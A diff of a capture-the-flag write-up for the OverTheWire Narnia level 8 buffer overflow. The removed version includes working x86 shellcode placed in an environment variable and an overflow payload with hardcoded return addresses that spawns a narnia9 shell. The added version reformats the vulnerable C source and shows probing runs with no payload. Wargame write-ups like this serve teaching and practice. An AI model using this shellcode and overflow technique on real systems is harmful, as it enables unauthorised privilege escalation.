@@ -1,1 +1,76 @@
-<pre> ```c #include &lt;stdlib.h&gt; #include &lt;string.h&gt; // gcc's variable reordering fucked things up // to keep the level in its old style i am // making "i" global until i find a fix // -morla int i; void func(char *b){ char *blah = b; char bok[20]; // int i = 0; memset(bok, '\0', sizeof(bok)); for(i = 0; blah[i] != '\0'; i++) bok[i] = blah[i]; printf("%s\n", bok); } int main(int argc, char **argv){ if(argc > 1) func(argv[1]); else printf("%s argument\n", argv[0]); return 0; } ``` ## Narnia8 - Buffer Overflow Exploitation ### 🧠 Goal Gain a shell as `narnia9` by exploiting a buffer overflow in the `narnia8` binary. --- ### ✅ Step 1 – Review the vulnerable code The `func()` copies user input to a 20-byte buffer without bounds checking: ```c for(i = 0; blah[i] != '\0'; i++) bok[i] = blah[i]; ``` - `bok` has 20 bytes. - Input from `blah` is copied without bounds checking. - A buffer overflow occurs by overwriting the saved return address (EIP). - `i` is global, which affects stack layout slightly. --- ### ✅ Step 2 – Exploit strategy - Inject a shellcode in an environment variable: `SHELLCODE`. - Fill the buffer and overwrite return address to jump to shellcode. - Used NOP sled to increase chances of successful jump. --- ### ✅ Final Payload We calculated the offset, leaked the environment address via GDB: ```bash export SHELLCODE=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*50 + b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80")') ./narnia8 $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\x71\xd5\xff\xff" + b"AAAA" + b"\xc0\xd5\xff\xff")') ``` --- ### ✅ Result ```bash bash-5.2$ whoami narnia9 ``` --- </pre>
+# Narnia8 - Buffer Overflow Exploitation
+
+## Goal
+
+Gain a shell as `narnia9` by exploiting a buffer overflow vulnerability in the `narnia8` binary.
+
+---
+
+## Vulnerable Code
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int i;
+
+void func(char *b){
+    char *blah = b;
+    char bok[20];
+
+    memset(bok, '\0', sizeof(bok));
+    for(i = 0; blah[i] != '\0'; i++)
+        bok[i] = blah[i];
+
+    printf("%s\n", bok);
+}
+
+int main(int argc, char **argv){
+    if(argc > 1)
+        func(argv[1]);
+    else
+        printf("%s argument\n", argv[0]);
+
+    return 0;
+}
+```
+
+Let’s see what the func do. We have a bok[20] , and *blah which is a pointer to argv[1]. Then we copy from blah[i] to bok[i] until blah is != 0.
+
+```
+narnia8@gibson:~$ cd /narnia
+narnia8@gibson:/narnia$ ls -la
+total 160
+drwxr-xr-x  2 root    root     4096 Apr 10 14:24 .
+drwxr-xr-x 28 root    root     4096 Jul  4 13:31 ..
+-r-sr-x---  1 narnia1 narnia0 15044 Apr 10 14:23 narnia0
+-r--r-----  1 narnia0 narnia0  1229 Apr 10 14:23 narnia0.c
+-r-sr-x---  1 narnia2 narnia1 14884 Apr 10 14:23 narnia1
+-r--r-----  1 narnia1 narnia1  1021 Apr 10 14:23 narnia1.c
+-r-sr-x---  1 narnia3 narnia2 11280 Apr 10 14:23 narnia2
+-r--r-----  1 narnia2 narnia2  1022 Apr 10 14:23 narnia2.c
+-r-sr-x---  1 narnia4 narnia3 11520 Apr 10 14:24 narnia3
+-r--r-----  1 narnia3 narnia3  1699 Apr 10 14:24 narnia3.c
+-r-sr-x---  1 narnia5 narnia4 11312 Apr 10 14:24 narnia4
+-r--r-----  1 narnia4 narnia4  1080 Apr 10 14:24 narnia4.c
+-r-sr-x---  1 narnia6 narnia5 11512 Apr 10 14:24 narnia5
+-r--r-----  1 narnia5 narnia5  1262 Apr 10 14:24 narnia5.c
+-r-sr-x---  1 narnia7 narnia6 11568 Apr 10 14:24 narnia6
+-r--r-----  1 narnia6 narnia6  1602 Apr 10 14:24 narnia6.c
+-r-sr-x---  1 narnia8 narnia7 12036 Apr 10 14:24 narnia7
+-r--r-----  1 narnia7 narnia7  1964 Apr 10 14:24 narnia7.c
+-r-sr-x---  1 narnia9 narnia8 11320 Apr 10 14:24 narnia8
+-r--r-----  1 narnia8 narnia8  1269 Apr 10 14:24 narnia8.c
+narnia8@gibson:/narnia$ ./narnia8 AAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAA�����������
+narnia8@gibson:/narnia$ ./narnia8 AAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAA
+narnia8@gibson:/narnia$ ./narnia8 AAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAA������������
+narnia8@gibson:/narnia$ ./narnia8 AAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAA
+narnia8@gibson:/narnia$ 
+
+```
+
